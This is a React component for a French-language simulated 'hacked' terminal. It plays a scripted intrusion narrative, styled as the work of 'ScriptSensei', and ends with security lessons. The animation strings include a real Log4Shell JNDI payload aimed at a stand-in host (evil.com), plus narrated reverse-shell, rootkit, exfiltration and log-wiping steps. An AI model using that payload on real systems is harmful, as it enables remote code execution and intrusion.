import React, { useState, useEffect, useRef } from 'react';
import { TerminalLine, TerminalState } from './types';
import { executeCommand, getCommandSuggestions } from './commands';

const Terminal: React.FC = () => {
  const [state, setState] = useState<TerminalState>({
    lines: [],
    currentInput: '',
    isBooting: true,
    showCursor: true,
    suggestions: []
  });

  const [isHacking, setIsHacking] = useState(false);
  const inputRef = useRef<HTMLInputElement>(null);
  const terminalRef = useRef<HTMLDivElement>(null);

  const bootSequence = [
    'GlobalCorp Systèmes - Accès Terminal',
    'Chargement de la connexion sécurisée...',
    '████████████████████] 100%',
    '',
    '⚠️  BRÈCHE DE SÉCURITÉ DÉTECTÉE ⚠️',
    '',
    'Système compromis par : ScriptSensei',
    'Connexion détournée à : 03:44 GMT',
    'À vous de jouer, administrateur...',
    '',
    'Tapez "help" pour voir les commandes disponibles',
    'Tapez "whoami" pour découvrir la vérité',
    '',
  ];

  const hackingSequence = [
    '🔴 INITIALISATION DE LA SÉQUENCE DE PÉNÉTRATION AVANCÉE...',
    '',
    '> Scanning network topology...',
    '> 192.168.1.0/24 - 254 hosts discovered',
    '> Identifying vulnerable services...',
    '',
    '🔍 RECONNAISSANCE PHASE:',
    '> Port 22 (SSH) - OPEN - Weak credentials detected',
    '> Port 80 (HTTP) - OPEN - Outdated Apache 2.2.15',
    '> Port 443 (HTTPS) - OPEN - SSL certificate expired',
    '> Port 3306 (MySQL) - OPEN - Default root password',
    '',
    '⚡ EXPLOITATION PHASE:',
    '> Exploiting CVE-2021-44228 (Log4Shell)...',
    '> ${jndi:ldap://evil.com/exploit} - PAYLOAD INJECTED',
    '> Reverse shell established on port 4444',
    '> Privilege escalation via sudo vulnerability...',
    '',
    '🎯 POST-EXPLOITATION:',
    '> Dumping /etc/passwd...',
    '> root:x:0:0:root:/root:/bin/bash',
    '> admin:x:1000:1000:Admin User:/home/admin:/bin/bash',
    '> Extracting SSH keys from ~/.ssh/',
    '> Accessing database credentials...',
    '',
    '💾 DATA EXFILTRATION:',
    '> Customer database: 2.3M records - DOWNLOADED',
    '> Financial reports Q1-Q4 2024 - DOWNLOADED',
    '> Employee personal data - DOWNLOADED',
    '> Source code repository - CLONED',
    '',
    '🔐 PERSISTENCE MECHANISMS:',
    '> Installing rootkit in /usr/lib/systemd/',
    '> Creating backdoor user "maintenance"',
    '> Modifying crontab for persistence',
    '> Disabling security logs rotation',
    '',
    '🌐 LATERAL MOVEMENT:',
    '> Scanning internal network 10.0.0.0/8',
    '> Domain controller 10.0.1.10 - COMPROMISED',
    '> File server 10.0.1.20 - COMPROMISED',
    '> Email server 10.0.1.30 - COMPROMISED',
    '',
    '📧 SOCIAL ENGINEERING:',
    '> Sending phishing emails to all employees...',
    '> CEO credentials harvested via fake login page',
    '> CFO\'s laptop compromised via USB drop',
    '',
    '🚨 COVERING TRACKS:',
    '> Clearing system logs...',
    '> Modifying timestamps...',
    '> Removing command history...',
    '> Installing log cleaning script...',
    '',
    '✅ MISSION ACCOMPLISHED:',
    '',
    '╔══════════════════════════════════════════════════════════╗',
    '║                    HACK COMPLETED                        ║',
    '║                                                          ║',
    '║  🎯 TARGETS COMPROMISED: 47                             ║',
    '║  💰 FINANCIAL DAMAGE: €2.4M                            ║',
    '║  📊 DATA STOLEN: 847 GB                                 ║',
    '║  ⏱️  TIME ELAPSED: 23 minutes                           ║',
    '║  🔒 BACKDOORS INSTALLED: 12                             ║',
    '║                                                          ║',
    '║  STATUS: TOTAL SYSTEM DOMINATION                        ║',
    '╚══════════════════════════════════════════════════════════╝',
    '',
    '🎭 ScriptSensei says:',
    '"Votre infrastructure était un château de cartes.',
    ' J\'ai simplement soufflé dessus."',
    '',
    '💡 LEÇONS APPRISES:',
    '• Mettez à jour vos systèmes régulièrement',
    '• Utilisez des mots de passe forts et uniques',
    '• Implémentez une authentification multi-facteurs',
    '• Segmentez votre réseau correctement',
    '• Formez vos employés à la cybersécurité',
    '• Surveillez vos logs en temps réel',
    '',
    '⚠️  CETTE DÉMONSTRATION EST TERMINÉE ⚠️',
    'Mais souvenez-vous... dans la vraie vie, les conséquences seraient réelles.',
    '',
    'Tapez une autre commande pour continuer l\'exploration...',
  ];

  useEffect(() => {
    if (state.isBooting) {
      let index = 0;
      const interval = setInterval(() => {
        if (index < bootSequence.length) {
          setState(prev => ({
            ...prev,
            lines: [...prev.lines, {
              type: 'system',
              content: bootSequence[index],
              timestamp: new Date().toLocaleTimeString()
            }]
          }));
          index++;
        } else {
          setState(prev => ({ ...prev, isBooting: false }));
          clearInterval(interval);
          setTimeout(() => inputRef.current?.focus(), 500);
        }
      }, 300);

      return () => clearInterval(interval);
    }
  }, [state.isBooting]);

  useEffect(() => {
    // Scroll to bottom when new lines are added
    if (terminalRef.current) {
      terminalRef.current.scrollTop = terminalRef.current.scrollHeight;
    }
  }, [state.lines]);

  useEffect(() => {
    // Cursor blinking effect
    const interval = setInterval(() => {
      setState(prev => ({ ...prev, showCursor: !prev.showCursor }));
    }, 500);

    return () => clearInterval(interval);
  }, []);

  const runHackingDemo = async () => {
    setIsHacking(true);
    
    for (let i = 0; i < hackingSequence.length; i++) {
      const line = hackingSequence[i];
      
      // Add glitch effect for critical lines
      const isGlitchLine = line.includes('🔴') || line.includes('⚡') || line.includes('🎯') || line.includes('✅');
      
      setState(prev => ({
        ...prev,
        lines: [...prev.lines, {
          type: 'output',
          content: line,
          timestamp: new Date().toLocaleTimeString()
        }]
      }));

      // Variable delays for dramatic effect
      let delay = 150;
      if (line.includes('PHASE:') || line.includes('COMPLETED')) delay = 800;
      if (line.includes('> ') && !line.includes('DOWNLOADED')) delay = 300;
      if (line.includes('DOWNLOADED') || line.includes('COMPROMISED')) delay = 500;
      if (line === '') delay = 100;
      if (line.includes('╔') || line.includes('╚')) delay = 600;

      await new Promise(resolve => setTimeout(resolve, delay));

      // Add glitch effect
      if (isGlitchLine) {
        document.body.classList.add('glitch');
        setTimeout(() => document.body.classList.remove('glitch'), 200);
      }
    }
    
    setIsHacking(false);
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (isHacking) return; // Disable input during hacking demo
    
    const value = e.target.value;
    setState(prev => ({
      ...prev,
      currentInput: value,
      suggestions: getCommandSuggestions(value)
    }));
  };

  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (isHacking) return; // Disable input during hacking demo
    
    if (e.key === 'Enter') {
      handleCommandExecution();
    } else if (e.key === 'Tab') {
      e.preventDefault();
      handleAutoComplete();
    } else if (e.key === 'ArrowUp' || e.key === 'ArrowDown') {
      e.preventDefault();
      // Could implement command history here
    }
  };

  const handleCommandExecution = async () => {
    const command = state.currentInput.trim();
    if (!command) return;

    // Add input line
    const inputLine: TerminalLine = {
      type: 'input',
      content: `scriptsensei@systeme-compromis:~$ ${command}`,
      timestamp: new Date().toLocaleTimeString()
    };

    setState(prev => ({
      ...prev,
      lines: [...prev.lines, inputLine],
      currentInput: ''
    }));

    // Check for hack command
    if (command.toLowerCase() === 'hack') {
      await runHackingDemo();
      return;
    }

    // Execute other commands
    setTimeout(() => {
      const response = executeCommand(command);
      
      if (response === 'CLEAR_SCREEN') {
        setState(prev => ({
          ...prev,
          lines: []
        }));
      } else {
        const responseLines = Array.isArray(response) ? response : [response];
        const outputLines: TerminalLine[] = responseLines.map(line => ({
          type: 'output',
          content: line,
          timestamp: new Date().toLocaleTimeString()
        }));

        setState(prev => ({
          ...prev,
          lines: [...prev.lines, ...outputLines]
        }));
      }
    }, 100);
  };

  const handleAutoComplete = () => {
    if (state.suggestions.length === 1) {
      setState(prev => ({
        ...prev,
        currentInput: state.suggestions[0],
        suggestions: []
      }));
    } else if (state.suggestions.length > 1) {
      // Show suggestions
      const suggestionLine: TerminalLine = {
        type: 'output',
        content: state.suggestions.join('  '),
        timestamp: new Date().toLocaleTimeString()
      };

      setState(prev => ({
        ...prev,
        lines: [...prev.lines, suggestionLine]
      }));
    }
  };

  const handleTerminalClick = () => {
    if (!isHacking) {
      inputRef.current?.focus();
    }
  };

  return (
    <div className="min-h-screen bg-black text-green-400 font-mono text-sm relative overflow-hidden">
      {/* CRT Effects */}
      <div className="absolute inset-0 bg-gradient-to-b from-transparent via-green-400/5 to-transparent pointer-events-none animate-pulse"></div>
      <div className="absolute inset-0 bg-gradient-to-r from-transparent via-green-400/3 to-transparent pointer-events-none"></div>
      
      {/* Scanlines */}
      <div className="absolute inset-0 pointer-events-none"
           style={{
             backgroundImage: 'repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0, 255, 0, 0.03) 2px, rgba(0, 255, 0, 0.03) 4px)',
           }}>
      </div>

      {/* Enhanced glitch overlay for hack demo */}
      {isHacking && (
        <div className="absolute inset-0 pointer-events-none z-10">
          <div className="absolute inset-0 bg-red-500/10 animate-pulse"></div>
          <div className="absolute top-0 left-0 right-0 h-1 bg-red-400 animate-pulse"></div>
          <div className="absolute bottom-0 left-0 right-0 h-1 bg-red-400 animate-pulse"></div>
        </div>
      )}

      {/* Terminal Content */}
      <div 
        ref={terminalRef}
        className="p-4 h-screen overflow-y-auto cursor-text"
        onClick={handleTerminalClick}
      >
        {/* Header */}
        <div className="mb-4 text-center">
          <div className="text-red-400 text-lg font-bold animate-pulse">
            ⚠️  ACCÈS NON AUTORISÉ DÉTECTÉ ⚠️
          </div>
          <div className="text-green-300 text-xs mt-2">
            Terminal compromis par ScriptSensei | Tapez 'help' pour les commandes
          </div>
        </div>

        {/* Terminal Lines */}
        {state.lines.map((line, index) => (
          <div
            key={index}
            className={`mb-1 leading-6 ${
              line.type === 'input' 
                ? 'text-green-300' 
                : line.type === 'system'
                ? 'text-cyan-400'
                : 'text-green-400'
            } ${line.type === 'system' ? 'animate-pulse' : ''} ${
              isHacking && ((line.content || '').includes('🔴') || (line.content || '').includes('⚡') || (line.content || '').includes('🎯') || (line.content || '').includes('✅'))
                ? 'text-red-400 font-bold animate-pulse'
                : ''
            }`}
          >
            {line.content || ''}
          </div>
        ))}

        {/* Current Input Line */}
        {!state.isBooting && !isHacking && (
          <div className="flex items-center text-green-300">
            <span className="mr-2">scriptsensei@systeme-compromis:~$</span>
            <input
              ref={inputRef}
              type="text"
              value={state.currentInput}
              onChange={handleInputChange}
              onKeyDown={handleKeyDown}
              className="bg-transparent border-none outline-none text-green-400 flex-1 font-mono"
              autoFocus
              spellCheck={false}
              autoComplete="off"
            />
            {state.showCursor && (
              <span className="bg-green-400 text-black w-2 h-5 inline-block ml-1 animate-pulse">█</span>
            )}
          </div>
        )}

        {/* Loading cursor during boot */}
        {state.isBooting && (
          <div className="flex items-center text-green-300 mt-4">
            <span className="mr-2">Chargement</span>
            {state.showCursor && (
              <span className="bg-green-400 text-black w-2 h-5 inline-block animate-pulse">█</span>
            )}
          </div>
        )}

        {/* Hacking in progress indicator */}
        {isHacking && (
          <div className="flex items-center text-red-400 mt-4 font-bold animate-pulse">
            <span className="mr-2">🔴 HACK EN COURS - NE PAS INTERROMPRE</span>
            <span className="bg-red-400 text-black w-2 h-5 inline-block animate-pulse">█</span>
          </div>
        )}

        {/* Suggestions */}
        {state.suggestions.length > 1 && !isHacking && (
          <div className="mt-2 text-yellow-400 text-xs">
            Suggestions : {state.suggestions.join(', ')}
          </div>
        )}
      </div>

      {/* Glitch Effect Overlay */}
      <div className="absolute inset-0 pointer-events-none">
        <div className="absolute top-1/4 left-0 right-0 h-px bg-green-400 opacity-20 animate-pulse"></div>
        <div className="absolute bottom-1/3 left-0 right-0 h-px bg-green-400 opacity-10 animate-pulse" style={{ animationDelay: '0.5s' }}></div>
      </div>
    </div>
  );
};

export default Terminal;